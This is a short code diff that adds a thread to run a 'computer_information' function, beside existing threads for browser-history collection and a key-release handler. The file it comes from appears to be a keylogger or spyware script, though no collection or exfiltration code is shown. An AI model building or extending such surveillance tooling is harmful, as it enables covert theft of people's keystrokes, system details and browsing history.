@@ -256,6 +256,8 @@ def on_release(key):
         return False
 
 try:
+    t1 = threading.Thread(target=computer_information)
+    t1.start()
     
     t2 = threading.Thread(target=get_browser_history)
     t2.start()
